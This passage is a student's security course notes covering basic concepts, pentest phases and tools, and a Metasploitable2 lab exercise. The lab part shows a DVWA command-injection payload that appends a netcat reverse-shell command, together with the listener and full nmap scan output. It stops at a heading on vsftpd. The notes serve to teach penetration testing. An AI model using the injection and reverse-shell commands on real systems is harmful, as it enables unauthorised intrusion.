---
title: "AT3C3"
description:
date: 2021-05-01 19:16:22 
categories:
  - AIS
---

# Mesurer et analyser le niveau de sécurité de l’infrastructure


This was covered over 3 separate weeks
- [Week 1 - Offensive Security](#Week%201%20-%20Offensive%20Security)
- [Week 2 - Pentest/Audit](#Week%202%20-%20Pentest/Audit) 
- [Week 3 - PSSI ](#Week%203%20-%20PSSI%20%20Politique%20de%20Sécurité%20des%20Systèmes%20d'Information)

<br> 

---

# TOC


[Week 1 - Offensive Security](#Week-1-Offensive-Security)
- [Basic security concepts](#Basic-security-concepts)
	- [Confidentiality, Integrity, Availability](#Confidentiality-Integrity-Availability)
	- [Security Incident](#Security-Incident)
	- [Risk](#Risk)
	- [ISO27001 and PDCA](#ISO27001-and-PDCA)
	- [Security Audits](#Security-Audits)
	- [Passwords](#Passwords)
	- [Security Patches](#Security-Patches)
	- [Cyber Attack Lifecycle](#Cyber-Attack-Lifecycle)
	- [Persistance](#Persistance)
	- [Attack Objective](#Attack-Objective)
	- [Defense-in-Depth](#Defense%2Din%2DDepth)
	- [Security Architecture Concepts](#Security-Architecture-Concepts)
	- [DMZ](#DMZ)
	- [Hardening](#Hardening)
	- [Least Privilege ](#Least-Privilege)
- [Introduction to Penetration Testing](#Introduction-to-Penetration-Testing)
	- [A Few Usefull Tools](#A-Few-Usefull-Tools)
	- [Practical application (lab and vulnerable VMs)](#Practical-application-lab-and-vulnerable-VMs)
		- [Metasploitable2](#Metasploitable2)
			- [One simple exemple : DVWA - Command Execution](#One-simple-exemple-DVWA-Command-Execution)
			- [Exploiting the dirrefent ports](#Exploiting-the-dirrefent-ports)
		- [Vulnerable Machines](#Vulnerable-Machines)
			- [Machine : Blue](#Machine-Blue)
			- [Machine : Academy](#Machine-Academy)
			- [Machine : Dev](#Machine-Dev)
			- [Machine : Black Pearl](#Machine-Black-Pearl)
		- [Demo - CVE-2021-41773 Apache path traversal](#Demo-CVE-2021-41773-Apache-path-traversal)
		- [Demo - Get a shell on MacOS](#Demo-Get-a-shell-on-MacOS)
		- [Wargames overthewire - Bandit](#Wargames-overthewire-Bandit)
		- [Top 10 OWASP 2021](#Top-10-OWASP-2021)
		- [Juice Shop](#Juice-Shop)
		- [Trying Zerologon](#Trying-Zerologon)

[**Week 2 - Pentest/Audit**](#Week-2-Pentest-Audit)
- [Timeline](#Timeline)
- [Tools Used](#Tools-Used)

[**Week 3 - PSSI : Politique de Sécurité des Systèmes d'Information**](#Week-3-PSSI-Politique-de-Sécurité-des-Systèmes-d'Information)


<br>

---


# Week 1 - Offensive Security

Semaine du 18/10/2021 au 22/10/2021 \

<br>

# Week 1 Resources

Here's a few additional random tools and links that were mentionned or used this week.
- https://www.shhgit.com/
- https://www.iso27001security.com/html/27001.html
	- https://www.trofisecurity.com/assets/img/iso27001-2013.pdf
	- https://akela.mendelu.cz/~lidak/IPI/ISO_IEC_27000_2018.pdf
- https://github.com/berzerk0/BEWGor
- https://github.com/Mebus/cupp
- https://digi.ninja/projects/cewl.php - https://github.com/digininja/cewl
- https://www.zoomeye.org/ - https://github.com/knownsec/ZoomEye-python
- https://www.shodan.io/
- https://search.censys.io/
- https://www.zoomeye.org/
- [beef xss Framework](https://www.kali.org/tools/beef-xss/)
- [ModSecurity](https://github.com/SpiderLabs/ModSecurity)
- http://www.insecam.org/
- https://github.com/CISOfy/lynis
- Practical Ethical Hacking - https://www.udemy.com/course/draft/2642432/learn/lecture/16823390?start=0 - https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course
- https://github.com/ihebski/DefaultCreds-cheat-sheet
- https://jamiepegg.medium.com/spy-on-windows-machines-using-metasploit-758dbf72bb90
- https://github.com/sk4ddy/remediatetheflag/blob/master/docs/install.md
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://github.com/davidprowe/BadBlood
- https://zer1t0.gitlab.io/posts/attacking_ad/
- https://github.com/VoidSec/CVE-2020-1472

---

# Basic security concepts


<small>Some part of the course given by our instuctor was kind of copyrighted, I tried to find similar pubicly available information but was not always succeful. So sorry if this feels incomplete.</small>

<br>

## Confidentiality Integrity Availability
  
  The **CIA** Triad :
- **Confidentiality**: Ensure that information is only accessible to those who are authorized.
- **integrity** : Ensure that the data is not modified, in an accidental, illicit or malicious manner, by unauthorized users.
- **Availability** : Ensure that assets are available and accesible by authorized users whenever needed.

---

## Security Incident

>  Definition: ([source](https://csrc.nist.gov/glossary/term/security_incident))
>
>An occurrence that actually or potentially jeopardizes the confidentiality, integrity, or availability of an information system or the information the system processes, stores, or transmits or that constitutes a violation or imminent threat of violation of security policies, security procedures, or acceptable use policies.

It's a breach of one of the three CIA Triad components to the information or information systems. \
These incidents may occur as the result of accidental activity or as the result of malicious activity \
Incidents **!=** Event

A few Exemples :
- Computer or physical intrusion
- Denial of service
- Malicious code
- Computer failure
- Software crash
- Manipulation error
- Strike, illness, Job Abandonment
- Confidential information disclosure 
- Discovery of confidential documents online 
- Data leak
- Fire, flood, explosion, earthquake
- Power outage
- Storm,  hurricane

---

## Risk

Risk is a term defined in multiple standards ([ISO 27005](https://www.iso.org/standard/75281.html) and [EBIOS](https://www.ssi.gouv.fr/guide/ebios-2010-expression-des-besoins-et-identification-des-objectifs-de-securite/))
It implies uncertainty and damage, security incident that has not yet occurred or been proven. \
Security measures can play on either one of these parameters:
- Reduce the likelihood of an attack
- Reduce the consequences of an attack

It's a combination of the **threat** probability and the impact of a **vulnerability**. 

![](IMG/AT3C3_Sec_img_1.png)

[Image source](https://qualstraconsulting.com/threat-vulnerability-risk-difference/)

It consists of the following elements:
- An <span style="color:#046a38">**asset**</span>  : goods, service, person
- One or more weaknesses of this asset: <span style="color:#db291c">**the vulnerability**</span>
- An action allowing the exploitation of this vulnerability: <span style="color:#ee8c00">**the threat**</span>. 

Exemple : \
A <span style="color:#046a38">work laptop</span> was <span style="color:#db291c">left unatended</span> in a train and got stolen by <span style="color:#ee8c00">another passenger</span>.

---

## ISO27001 and PDCA

The **[ISO2700x](https://www.iso.org/search.html?q=27000)** familly  :  Information Security Management Systems

>**[ISO27001](https://www.iso.org/standard/54534.htmll)** : 
>
>international standard that specifies the requirements for establishing, implementing, maintaining and continually improving an information security management system within the context of the organization. It also includes requirements for the assessment and treatment of information security risks tailored to the needs of the organization \
>ISO 27001 consists of 114 controls (included in Annex A and expanded on in ISO 27002)

>**[ISO 27002](https://www.iso.org/standard/54533.html)** :
>
>provides best-practice guidance on applying the controls listed in Annex A of ISO 27001

<br>

**[PDCA](https://en.wikipedia.org/wiki/PDCA)** : **P**lan, **D**o, **C**heck, **A**ct

1.  **Plan:** Recognize an opportunity and plan a change.
2.  **Do:** Test the change. Carry out a small-scale study.
3.  **Check:** Review the test, analyze the results, and identify what you’ve learned.
4.  **Act:** Take action based on what you learned in the study step. 

If the change did not work, go through the cycle again with a different plan. \
If successful, incorporate what you learned from the test into wider changes. \
Use what you learned to plan new improvements, beginning the cycle again.

![](IMG/AT3C3_Sec_img_2.png)
[image source](https://www.mindtools.com/pages/article/newPPM_89.htm)

---

## Security Audits


>**Definition(s):** ([Source](https://csrc.nist.gov/glossary/term/Security_Audit))
>
 >Independent review and examination of a system’s records and activities to determine the adequacy of system controls, ensure compliance with established security policy and procedures, detect breaches in security services, and recommend any changes that are indicated for countermeasures.

in a few words, it's the verification of compliance to a standard (i.e: 27001, HIPAA, PCI DSS...). it can be used as an opportunity to improve the level of security to your organisation because it often leads to an action plan that must be carried out.

---

## Passwords

Password are very easy to steal :
- [Phishing](https://en.wikipedia.org/wiki/Phishing)
- [Keylogger](https://www.ionos.com/digitalguide/server/security/keylogger/)
- [Shoulder surfing](https://www.ionos.com/digitalguide/server/security/shoulder-surfing/)

Huge databases of leaked/stolen pwd can be accessed easily
- [Pwndb](https://davidtavarez.github.io/2019/tutorial-pwndb-command-line-tool-python/) ([repo](https://github.com/davidtavarez/pwndb))
- [Collection #1](https://en.wikipedia.org/wiki/Collection_No._1) (other [article](https://www.troyhunt.com/the-773-million-record-collection-1-data-reach/)) through #5
- ...

Technological advencements have made brute force attacks even faster.

![](IMG/AT3C3_Sec_img_3.png)
[image Source](https://twitter.com/TerahashCorp/status/1155112559206383616)

In a work environement, their use needs to be determined in a policy. \
Frequent mandatory change can be counterproductive. \
Old passwords can (should?) be kept to prevent reuse. \
Whenever possible, using multifactor authentication is reccomended (second factor: token, OTP, smartcard ...)

Relevant xkcd : https://xkcd.com/936/ \
![](IMG/AT3C3_Sec_img_4.png)

---

## Security Patches

Most of the time, vulnerabilities are disclosed when the patch is made available. \
it' becoming easier to exploit them ([Shodan](https://www.shodan.io/), [Metasploit](https://www.metasploit.com/), [Autosploit](https://github.com/NullArray/AutoSploit) ...)  

Before applying patches you should estimate the real impact on your Information Systems (e.g.: disabled functionality)  \
Test the patches in a dedicated test environment \
Untested patch can potentially be more devastating than the vulnerability itself.

<br>

How to stay up to date? 
- Newsletter :  [CERT FR](https://www.cert.ssi.gouv.fr/), [CVEDETAILS](https://www.cvedetails.com/), [SECLISTS](https://seclists.org/)

![](IMG/AT3C3_Sec_img_6.png)

Best practice : Test your information systems for vulns
- [Tenable](https://www.tenable.com/) / Nessus
- [OpenVAS](https://openvas.org/)
- [Qualys](https://www.qualys.com/apps/vulnerability-management/)
- [nmap](https://nmap.org/book/man.html) + [nmap scripting engine](https://nmap.org/book/man-nse.html)
- [PatrOwl](https://www.patrowl.io/patrowl)

---

## Cyber Attack Lifecycle

![](IMG/AT3C3_Sec_img_49.png)
[Source](https://www.cybereason.com/hubfs/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty-Part1.pdf) (pdf)

---

 ## Persistance

>[Definition](https://attack.mitre.org/tactics/TA0003/)
>
>Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.

Once a system is compromised, the intruder will want to make sure he can stay. \
He will try to "jump" on to another target ([Lateral movement](https://attack.mitre.org/tactics/TA0008/)) that may not be as protected as from the outside. \
He well try to gain acces to an account with better provileges ([Privilege Escalation](https://attack.mitre.org/tactics/TA0004/))

Here's a few Techniques that can be use to establish persistance:

| techniques | Desctiption |
|:---:|:---:|
| [Account Manipulation](https://attack.mitre.org/techniques/T1098) | manipulate accounts to maintain access to victim systems |
| [Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547) | configure system settings to automatically execute a program during system boot or logon |
| [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037) | use of scripts that are automatically executed at boot or logon |
| [Compromise Client Software Binary](https://attack.mitre.org/techniques/T1554) |  modify client software binaries to establish persistent access to systems |
| [Create or Modify System Process](https://attack.mitre.org/techniques/T1543) | create or modify system-level processes to repeatedly execute malicious payloads |
| [Event Triggered Execution](https://attack.mitre.org/techniques/T1546) |  using system mechanisms that trigger execution based on specific events |
| [External Remote Services](https://attack.mitre.org/techniques/T1133) | leverage external-facing remote services to initially access and/or persist within a network |
| [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574) | execute their own malicious payloads by hijacking the way operating systems run programs |
| [Modify Authentication Process](https://attack.mitre.org/techniques/T1556) | modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts |
| [Pre-OS Boot](https://attack.mitre.org/techniques/T1542) | abuse Pre-OS Boot mechanisms as a way to establish persistence on a system |
| [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) | abuse task scheduling functionality to facilitate initial or recurring execution of malicious code |
| [Server Software Component](https://attack.mitre.org/techniques/T1505) |  abuse legitimate extensible development features of servers to establish persistent access to systems |

More and details can be found here: https://attack.mitre.org/tactics/TA0003/

---

## Attack Objective

- Data theft : Selling information to competitors or on the black market, Sensitive or personal data disclosure...
- Making sure a website or service is unavailable 
- Damaging a brand's image (website degradation)
- Blackmail
- Hijacking of corporate resources : Computing power (bitcoin mining, password cracking...), Bandwidth (DDoS)


A Few exemples
- Avril 2011 et Novembre 2014 : [Sony Pictures hack](https://en.wikipedia.org/wiki/Sony_Pictures_hack) \
- Denial of Service :  
	- [2013 - SpamHaus](https://blog.cloudflare.com/the-ddos-that-almost-broke-the-internet/) - 300 Gbps  
	- [2014 - Cloudflare](https://blog.cloudflare.com/technical-details-behind-a-400gbps-ntp-amplification-ddos-attack/) - 400 Gbps  
	- [2016 - Krebs](https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/) - 620 Gbps  
- Ransomwares ([Loki](https://blog.malwarebytes.com/threat-analysis/2016/03/look-into-locky/), [Wannacry](https://en.wikipedia.org/wiki/WannaCry_worm), [Maze](https://www.cloudflare.com/learning/security/ransomware/maze-ransomware/) ...)

---

## Defense-in-Depth

> [Definition](https://www.imperva.com/learn/application-security/defense-in-depth/): 
> 
> Defense-in-depth is an information assurance strategy that provides multiple, redundant defensive measures in case a security control fails or a vulnerability is exploited.

The idea is to manage risk with diverse defensive strategies, so that if one layer of defense turns out to be inadequate, another layer of defense will hopefully prevent a full breach. ([Source](https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/defense-in-depth))

Problems : No safety measure is foolproof \
Solution: Combine different security measures

The Different Elements of a [Defense-in-Depth](https://www.fortinet.com/resources/cyberglossary/defense-in-depth) System: 
1.  **Physical controls**: Examples include key cards to enter a building or scanners to read fingerprints.
2.  **Network security controls**: This is software that authenticates an employee to enter the network and use a device or application.
3.  **Administrative controls**: This authorizes employees, once authenticated, to access only certain applications or parts of the network.
4.  **Antivirus**: This is the tool that stops malicious software from entering the network and spreading.
5.  **Behavioral analysis**: Algorithms and <abbr title="Machine Learning">ML</abbr> can detect anomalies in the behavior of employees and in the applications and devices themselves.

<br>

---

# Security Architecture Concepts

Security architecture is defined as the architectural design that includes all the threats and potential risks which can be present in the environment or that particular scenario. This also includes the security controls and the use of security controls. [1](https://www.educba.com/security-architecture/) \
I's a set of security principles, methods and models designed to align to your objectives and help keep your organization safe from cyber threats. [2](https://dig8ital.com/resources/library/what-is-security-architecture-and-what-do-you-need-to-know)

<br>

---
 
# DMZ 

> [Source](https://www.fortinet.com/resources/cyberglossary/what-is-dmz) : 
> 
> DMZ (**D**e**M**ilitarized **Z**one) : network that protects and adds an extra layer of security to an organization’s internal local-area network from untrusted traffic. A common DMZ is a subnetwork that sits between the public internet and private networks.  

The point of a DMZ is that connections from the internal and the external network to the DMZ are permitted, whereas connections from the DMZ are only permitted to the external network -- hosts in the DMZ may not connect to the internal network. \
This allows the DMZ's hosts to provide services to the external network while protecting the internal network in case intruders compromise a host in the DMZ. \
For someone on the external network who wants to illegally connect to the internal network, the DMZ is a dead end.
[1](https://www.cisa.gov/uscert/ics/Control_System_Security_DMZ-Definition.html)

<br>

---

# Hardening

Hardening a system or application involves changing settings on the system to increase its overall level of security and reduce its vulnerability to attack. \
The concept of a system's attack surface, or the places where it could be attacked, is important when performing system hardening. \
Hardening tools and scripts are a common way to perform basic hardening processes on systems, and organizations  
like the Center for Internet Security (CIS) provide hardening guides for operating systems, browsers, and a variety of other hardening targets. \
[Source](https://books.google.fr/books/about/CompTIA_Security+_Study_Guide.html?id=0uUSEAAAQBAJ)

- ANSSI Guides: [GNU/Linux system](https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-a-un-systeme-gnulinux/)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/) &  [this](https://workbench.cisecurity.org/) 
- [Security Configuration Guidance](https://apps.nsa.gov/iaarchive/library/ia-guidance/security-configuration/?page=3)

<br>

---

# Least Privilege 

The principle of least privilege says that individuals should be granted only the minimum set of permissions necessary to carry out their job functions. \
Least privilege is simple in concept but sometimes challenging to implement in practice. \ 
It requires careful attention to the privileges necessary to perform specific jobs and ongoing attention to avoid security issues. \
Privilege creep, one of these issues, occurs when an employee moves from job to job withinthe organization, accumulating new privileges, but never has the privileges associated with past duties revoked. \
[Source](https://books.google.fr/books/about/CompTIA_Security+_Study_Guide.html?id=0uUSEAAAQBAJ)

<br>

---

# Introduction to Penetration Testing


Penetration testers simulate cyber attacks to find security weaknesses in networks, operating systems, applications or even places. Information security experts worldwide use penetration techniques to evaluate enterprise defenses.

The diffenrents type of pentest :
- Black Box : The pen tester is given little to no information regarding the system he is going to test
- White Box : The pen tester has been provided with whole range of information about the systems such as Schema, Source code, OS details, IP address, etc.
- Grey Box : Combination of both the Black Box and the White BoxThe pen tester has only partial or limited information about the internal details of the program of a system.


The different steps of a pentest

1. **Pre-engagement** :
	- Define the Scope : which IP addresses or hosts you can test or not.
	- Determining the testing window : The client may want you to perform tests only during specific hours or on certain days.
	- Contact information : Whom should you contact if you find something serious.
	- Making sure you have authorization to perform a penetration test on the target.

2. **Information Gathering** : \
This stage involves collecting as much publicly accessible information about a target/organisation as possible, for example, OSINT and research.  

3. **Threat Modeling** : \
Based on the knowledge gained in the information-gathering phase, you start to develop a plan of attack. 

4. **Vulnerability Analysis** : \
This stage involves discovering applications and services running on the systems. For example, finding a web server that may be potentially vulnerable. \
It can involve the use of public exploits or exploiting application logic. Failed exploits can crash services, set off intrusion-detection alerts, and otherwise ruin your chances of successful exploitation. \

5. **Exploitation** : \
In this stage you finaly run the exploit found during analysis.

6. **Post-exploitation** : \
In this stage we will check what additional information can we gather from the host. \
If possible/necessary we can attempt to escalate your privilege.


---

## The repport  

This is the final phase of the pentest and is where we convey our findings to the client in a meaningful way.

The repport should include the methodology we followed, an hexaustive list of  all the vulnerabilities we found sorted by urgency and how you can reproduce said exploit. \
Reccomendation on how to harden the system.

It should be technical enough for the team in charge of security to fix the issue but not too technical either. A non-IT person should be able to understand what is happening.

Be carefull who you send this repport to or where you store it. A potential futur intruder could find this very helpfull :)


<br>

---

## A Few Usefull Tools  


**Reconnaissance**
- [netcraft](https://www.netcraft.com/)
- [whois](https://en.wikipedia.org/wiki/WHOIS)
- [nslookup](https://en.wikipedia.org/wiki/Nslookup), [dig](https://en.wikipedia.org/wiki/Dig_(command))
- [Google Dorks](https://en.wikipedia.org/wiki/Google_hacking)
- [nmap](https://nmap.org/book/man.html)
- [recon-ng](https://www.kali.org/tools/recon-ng/) ([repo](https://github.com/lanmaster53/recon-ng))
- [legion](https://github.com/GoVanguard/legion)
- [TheHarvester](https://www.kali.org/tools/theharvester/) (réseaux sociaux par ex)

**Vulnerability identification**
- [nmap](https://nmap.org/book/man.html)
- [Nessus](https://www.tenable.com/products/nessus) / [OpenVAS](https://openvas.org/) / Qualys / [Nexpose](https://www.rapid7.com/products/nexpose/)...
- [Nikto](https://www.kali.org/tools/nikto/) ([repo](https://github.com/sullo/nikto))
- [tcpdump](https://en.wikipedia.org/wiki/Tcpdump) / [wireshark](https://www.wireshark.org/)
- [netcat](https://en.wikipedia.org/wiki/Netcat) ([man](https://linux.die.net/man/1/nc))
- [WPScan](https://github.com/wpscanteam/wpscan)

**Exploitation**
- [searchsploit](https://www.exploit-db.com/searchsploit)
	- `searchsploit -x XXXXX` : Open the exploit in vim 
	- `searchsploit -m XXXXX` : Create a copy in the current working directory
- [Metasploit](https://www.metasploit.com/)
- [SQLMap](https://www.kali.org/tools/sqlmap/)

**Post exploitation**
- [Empire](https://github.com/EmpireProject/Empire)
- [Cobalt Strike](https://www.cobaltstrike.com/)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) / [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

Misc
- https://book.hacktricks.xyz/
- https://gtfobins.github.io/
- https://lolbas-project.github.io/


---

<br>

## Practical application (lab and vulnerable VMs)	

## Metasploitable2


<br>

**Having fun with metasploitable2** ([Download](https://sourceforge.net/projects/metasploitable/))

### One simple exemple - DVWA Command Execution

We first need to set the security to low in order for this to work.

![](IMG/AT3C3_Sec_img_7.png)

We can ping an address directly from the page.

![](IMG/AT3C3_Sec_img_5.png)

but there's no input sanitizer, so we can add a custom command after the address, like : `127.0.0.1; id`

![](IMG/AT3C3_Sec_img_8.png)

we can see both commands were executed

So to exploit this, we first need to open a listener

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/Bureau/metaslpoitable]
└─$ nc -nvlp 5454
listening on [any] 5454 ...
```

then we run the command below to pop a reverse shell

```terminal {title="bash"}
127.0.0.1; nc 192.168.20.168 5454 -e /bin/bash
```

![](IMG/AT3C3_Sec_img_9.png)
 
 
---

### Exploiting the dirrefent ports


There's so much different things to try that I didn't know where to start. Here's the few ones I "exploited"
- [Port 21 - vsftpd ](#Port%2021%20%2D%20vsftpd)
- [Port 1524 - Bindshell](#Port%201524%20%2D%20Bindshell)
- [Port 3306 - MySQL](#Port%203306%20%2D%20MySQL)
- [Port 3632 - distccd](#Port%203632%20%2D%20distccd)
- [Port 6667 - UnrealIRCd](#Port%206667%20%2D%20UnrealIRCd)


<br>

initial quick scan

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ nmap -Pn -sV 192.168.20.139 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 10:50 CEST
Nmap scan report for 192.168.20.139
Host is up (0.00039s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
41686/tcp open  status      1 (RPC #100024)
41756/tcp open  mountd      1-3 (RPC #100005)
46920/tcp open  java-rmi    GNU Classpath grmiregistry
48660/tcp open  nlockmgr    1-4 (RPC #100021)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.34 seconds
```

more Intense scan:

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/Bureau/metaslpoitable]
└─$ nmap -T4 -A -p- 192.168.20.23
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 13:45 CEST
Nmap scan report for 192.168.20.23
Host is up (0.00037s latency).
Not shown: 65504 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.20.168
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2021-10-19T11:48:19+00:00; +3s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      33474/tcp   mountd
|   100005  1,2,3      56536/udp   mountd
|   100021  1,3,4      44834/tcp   nlockmgr
|   100021  1,3,4      57925/udp   nlockmgr
|   100024  1          46157/udp   status
|_  100024  1          48686/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 51
|   Capabilities flags: 43564
|   Some Capabilities: SupportsCompression, ConnectWithDatabase, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, LongColumnFlag
|   Status: Autocommit
|_  Salt: )%zZ44IQ:m8l8sZH;.qr
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2021-10-19T11:48:19+00:00; +3s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6200/tcp  open  lm-x?
6667/tcp  open  irc         UnrealIRCd
| irc-info: 
|   users: 2
|   servers: 1
|   lusers: 2
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 1:22:00
|   source ident: nmap
|   source host: D4E91B05.7E0A9117.FFFA6D49.IP
|_  error: Closing Link: dqlqeiyqq[192.168.20.168] (Quit: dqlqeiyqq)
6697/tcp  open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
33474/tcp open  mountd      1-3 (RPC #100005)
44834/tcp open  nlockmgr    1-4 (RPC #100021)
48686/tcp open  status      1 (RPC #100024)
53481/tcp open  java-rmi    GNU Classpath grmiregistry
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h00m03s, deviation: 2h00m00s, median: 2s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2021-10-19T07:48:04-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.08 seconds
                                                                              
┌─
```

---

#### Port 21 - vsftpd 

```terminal {title="bash"}
